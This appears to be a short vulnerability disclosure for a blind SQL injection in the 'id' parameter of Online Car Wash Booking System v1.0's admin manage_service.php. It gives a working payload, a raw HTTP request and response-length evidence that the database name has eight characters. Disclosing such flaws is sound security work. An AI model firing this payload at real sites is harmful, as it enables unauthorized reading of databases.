# Online Car Wash Booking System v1.0 by oretnom23 has SQL injection

vendors: https://www.sourcecodester.com/php/15274/online-car-wash-booking-system-phpoop-free-source-code.html

Vulnerability File: /ocwbs/admin/services/manage_service.php?id=

Vulnerability location: /ocwbs/admin/services/manage_service.php?id=, id

Current database name: ocwbs_db,length is 8

[+] Payload: /ocwbs/admin/services/manage_service.php?id=2%27%20and%20length(database())%20=8--+ // Leak place ---> id

```sql
GET /ocwbs/admin/services/manage_service.php?id=2%27%20and%20length(database())%20=8--+ HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=qr1o26kvu55cqqitadqht6jna5
Connection: close
```

When length (database ()) = 7, Content-Length: 2217
![image](https://user-images.githubusercontent.com/54017627/169305054-fb9b249b-9648-41d3-918d-e00ee0f299e6.png)

![image](https://user-images.githubusercontent.com/54017627/169304307-0ea9ecbb-d874-419f-aa46-99888f8e22f5.png)

When length (database ()) = 8, Content-Length: 2441
![image](https://user-images.githubusercontent.com/54017627/169305091-ad42103c-84d1-417a-9b55-7bd6875cf054.png)

![image](https://user-images.githubusercontent.com/54017627/169304269-eb6cbad5-db19-4db9-b016-13e887f70465.png)
